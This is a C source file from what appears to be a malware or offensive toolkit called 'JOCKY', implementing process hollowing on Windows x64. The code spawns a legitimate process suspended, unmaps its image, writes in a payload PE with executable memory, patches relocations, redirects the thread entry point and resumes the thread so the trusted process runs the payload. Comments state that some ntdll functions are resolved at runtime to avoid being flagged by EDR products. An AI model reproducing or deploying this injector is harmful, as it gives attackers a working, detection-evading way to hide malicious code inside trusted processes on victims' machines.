/*
 * JOCKY — Phase 9: Process Hollowing
 * =====================================
 * Spawns a legitimate host process suspended, unmaps its image,
 * writes a payload PE into the vacated space, patches the thread
 * entry-point, and resumes — the host process now executes our code.
 *
 * Build:
 *   clang hollow.c test_hollow.c -o test_hollow.exe -lkernel32 -lntdll
 *
 * Technique overview:
 *   1.  CreateProcess (CREATE_SUSPENDED)  — host process, frozen
 *   2.  NtUnmapViewOfSection              — evict host image from memory
 *   3.  VirtualAllocEx                    — reserve space for payload PE
 *   4.  Parse payload PE headers          — find ImageBase, SizeOfImage,
 *                                           SizeOfHeaders, sections
 *   5.  WriteProcessMemory (headers)      — write PE headers into target
 *   6.  WriteProcessMemory (sections)     — write each section into target
 *   7.  Relocate if necessary             — patch base relocation table
 *                                           if alloc address != preferred base
 *   8.  GetThreadContext                  — read suspended thread context
 *   9.  SetThreadContext (RCX = new EP)   — patch entry-point register
 *   10. ResumeThread                      — host process now runs payload
 */

#include "hollow.h"
#include <string.h>   /* memcpy, memset */

/* ── NT API types not in standard headers ────────────────────────────────── */

typedef LONG NTSTATUS;

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

/* ── Internal helpers ────────────────────────────────────────────────────── */

/*
 * get_nt_headers
 * --------------
 * Given a pointer to a PE image in memory, return its NT headers.
 * Returns NULL if either DOS or NT signature is wrong.
 */
static PIMAGE_NT_HEADERS64
get_nt_headers(LPVOID base)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)((BYTE *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    return nt;
}

/*
 * apply_relocations
 * -----------------
 * If the payload was allocated at a different address than its preferred
 * ImageBase, walk the base relocation table and patch every absolute
 * address in the image.
 *
 * Parameters:
 *   image_base   — address where the image was actually allocated
 *   preferred    — the preferred ImageBase from the PE optional header
 *   nt           — pointer to the payload's NT headers (in local memory)
 */
static void
apply_relocations(BYTE *image_base, ULONGLONG preferred,
                  PIMAGE_NT_HEADERS64 nt)
{
    LONGLONG delta = (LONGLONG)image_base - (LONGLONG)preferred;
    if (delta == 0)
        return;   /* no relocation needed */

    DWORD reloc_rva  = nt->OptionalHeader
                         .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
                         .VirtualAddress;
    DWORD reloc_size = nt->OptionalHeader
                         .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
                         .Size;

    if (reloc_rva == 0 || reloc_size == 0)
        return;   /* no relocation table — image was compiled /FIXED */

    BYTE *reloc_ptr = image_base + reloc_rva;
    BYTE *reloc_end = reloc_ptr + reloc_size;

    while (reloc_ptr < reloc_end) {
        PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)reloc_ptr;
        if (block->VirtualAddress == 0 || block->SizeOfBlock == 0)
            break;

        /*
         * Each relocation block covers a 4 KB page.
         * Entries follow the block header; each is a WORD:
         *   high 4 bits  = type  (IMAGE_REL_BASED_DIR64 = 10 for 64-bit)
         *   low  12 bits = offset within the page
         */
        DWORD  num_entries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                             / sizeof(WORD);
        WORD  *entries     = (WORD *)(block + 1);

        for (DWORD i = 0; i < num_entries; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                /* 64-bit absolute address — add delta */
                ULONGLONG *target =
                    (ULONGLONG *)(image_base + block->VirtualAddress + offset);
                *target += (ULONGLONG)delta;
            }
            /* type 0 = IMAGE_REL_BASED_ABSOLUTE = padding, skip */
        }

        reloc_ptr += block->SizeOfBlock;
    }
}

/* ── Public API ──────────────────────────────────────────────────────────── */

BOOL jocky_hollow_inject(
    LPCWSTR target_path,
    LPVOID  payload,
    SIZE_T  payload_size)
{
    BOOL result = FALSE;

    PROCESS_INFORMATION pi;
    STARTUPINFOW        si;
    CONTEXT             ctx;
    LPVOID              remote_base = NULL;

    memset(&pi,  0, sizeof(pi));
    memset(&si,  0, sizeof(si));
    memset(&ctx, 0, sizeof(ctx));
    si.cb = sizeof(si);

    /* ── Validate payload PE ─────────────────────────────────────────────── */
    PIMAGE_NT_HEADERS64 payload_nt = get_nt_headers(payload);
    if (!payload_nt) {
        SetLastError(ERROR_BAD_FORMAT);
        return FALSE;
    }

    ULONGLONG preferred_base   = payload_nt->OptionalHeader.ImageBase;
    DWORD     size_of_image    = payload_nt->OptionalHeader.SizeOfImage;
    DWORD     size_of_headers  = payload_nt->OptionalHeader.SizeOfHeaders;
    DWORD     entry_point_rva  = payload_nt->OptionalHeader.AddressOfEntryPoint;
    WORD      num_sections     = payload_nt->FileHeader.NumberOfSections;

    /* ── Step 1: spawn target suspended ─────────────────────────────────── */
    if (!CreateProcessW(
            target_path,          /* image to spawn    */
            NULL,                 /* command line      */
            NULL, NULL,           /* process/thread SA */
            FALSE,                /* no handle inherit */
            CREATE_SUSPENDED,     /* frozen on entry   */
            NULL,                 /* inherit env       */
            NULL,                 /* inherit cwd       */
            &si, &pi))
        return FALSE;

    /* ── Step 2: unmap the host image from the new process ───────────────── */
    /*
     * NtUnmapViewOfSection is not in kernel32 — resolve it from ntdll
     * at runtime. This avoids a hard import that some EDRs flag.
     */
    PFN_NtUnmapViewOfSection NtUnmap =
        (PFN_NtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"),
            "NtUnmapViewOfSection"
        );
    if (!NtUnmap)
        goto cleanup;

    /*
     * The host process's image base is in its PEB.
     * On x64, GetThreadContext with CONTEXT_FULL gives us the initial
     * register state — RCX holds the PEB address for the main thread
     * entry stub. However, the simpler approach: read the host image
     * base directly from the remote PEB via ReadProcessMemory.
     *
     * PEB is at (ULONG_PTR)[rdx] in the initial thread context on x64.
     * We need it to call NtUnmapViewOfSection with the right base.
     *
     * Simpler: use QueryInformationProcess to get PEB base, then
     * ReadProcessMemory to get ImageBaseAddress at PEB+0x10.
     */
    typedef LONG (NTAPI *PFN_NtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    PFN_NtQIP NtQIP = (PFN_NtQIP)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"),
        "NtQueryInformationProcess"
    );
    if (!NtQIP)
        goto cleanup;

    /* PROCESS_BASIC_INFORMATION is at info class 0 */
    typedef struct {
        PVOID     Reserved1;
        PVOID     PebBaseAddress;
        PVOID     Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID     Reserved3;
    } JOCKY_PROCESS_BASIC_INFO;

    JOCKY_PROCESS_BASIC_INFO pbi;
    memset(&pbi, 0, sizeof(pbi));
    NTSTATUS qs = NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
    if (qs != STATUS_SUCCESS) {
        SetLastError(ERROR_PROCESS_ABORTED);
        goto cleanup;
    }

    /* Read ImageBaseAddress from PEB+0x10 */
    LPVOID host_image_base = NULL;
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(
            pi.hProcess,
            (BYTE *)pbi.PebBaseAddress + 0x10,
            &host_image_base,
            sizeof(host_image_base),
            &bytes_read))
        goto cleanup;

    /* Unmap host image */
    NTSTATUS unmap_status = NtUnmap(pi.hProcess, host_image_base);
    if (unmap_status != STATUS_SUCCESS) {
        SetLastError(ERROR_ACCESS_DENIED);
        goto cleanup;
    }

    /* ── Step 3: allocate memory in target for payload ───────────────────── */
    /*
     * Try to allocate at the payload's preferred ImageBase first.
     * If that address is taken, Windows will choose another — we handle
     * relocation in step 7.
     */
    remote_base = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)preferred_base,
        size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remote_base) {
        /* Preferred base unavailable — let OS pick */
        remote_base = VirtualAllocEx(
            pi.hProcess,
            NULL,
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!remote_base)
            goto cleanup;
    }

    /* ── Steps 4+5: write PE headers into remote process ─────────────────── */
    if (!WriteProcessMemory(
            pi.hProcess,
            remote_base,
            payload,
            size_of_headers,
            NULL))
        goto cleanup;

    /* ── Step 6: write each section into remote process ─────────────────── */
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(payload_nt);

    for (WORD i = 0; i < num_sections; i++) {
        if (sections[i].SizeOfRawData == 0)
            continue;   /* BSS-style zero section — already zeroed by VirtualAllocEx */

        LPVOID dest   = (BYTE *)remote_base + sections[i].VirtualAddress;
        LPVOID src    = (BYTE *)payload     + sections[i].PointerToRawData;
        SIZE_T sz     = sections[i].SizeOfRawData;

        if (!WriteProcessMemory(pi.hProcess, dest, src, sz, NULL))
            goto cleanup;
    }

    /* ── Step 7: relocate if allocated at non-preferred address ─────────── */
    /*
     * apply_relocations patches our local copy of the payload, then
     * we write the patched headers back. This is simpler than patching
     * in the remote process byte-by-byte.
     *
     * We only need to patch the relocation table entries — sections are
     * already written; we re-write them after patching if needed.
     */
    if ((ULONGLONG)remote_base != preferred_base) {
        /*
         * Work on a local writable copy for relocation arithmetic,
         * then re-write the affected regions. Because relocation entries
         * point into data sections (not .text for most payloads), we
         * patch our local buffer and re-write each section.
         */
        apply_relocations((BYTE *)payload,
                          preferred_base,
                          payload_nt);

        /* Re-write headers with updated ImageBase field */
        payload_nt->OptionalHeader.ImageBase = (ULONGLONG)remote_base;
        WriteProcessMemory(pi.hProcess, remote_base, payload,
                           size_of_headers, NULL);

        /* Re-write sections with relocated data */
        for (WORD i = 0; i < num_sections; i++) {
            if (sections[i].SizeOfRawData == 0) continue;
            LPVOID dest = (BYTE *)remote_base + sections[i].VirtualAddress;
            LPVOID src  = (BYTE *)payload     + sections[i].PointerToRawData;
            WriteProcessMemory(pi.hProcess, dest, src,
                               sections[i].SizeOfRawData, NULL);
        }
    }

    /* ── Step 8: get suspended thread context ────────────────────────────── */
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx))
        goto cleanup;

    /* ── Step 9: patch entry-point ───────────────────────────────────────── */
    /*
     * On x64, the thread starts in ntdll!RtlUserThreadStart.
     * RCX = entry-point address, RDX = parameter (PEB pointer).
     * Overwrite RCX with our payload's entry point.
     */
    ctx.Rcx = (DWORD64)remote_base + entry_point_rva;

    if (!SetThreadContext(pi.hThread, &ctx))
        goto cleanup;

    /* ── Step 10: resume the hollowed process ────────────────────────────── */
    if (ResumeThread(pi.hThread) == (DWORD)-1)
        goto cleanup;

    result = TRUE;

cleanup:
    ; 
    DWORD saved = GetLastError();
    if (!result && pi.hProcess) {
        TerminateProcess(pi.hProcess, 1);   /* kill broken host */
    }
    if (pi.hThread)  CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (!result)     SetLastError(saved);
    return result;
}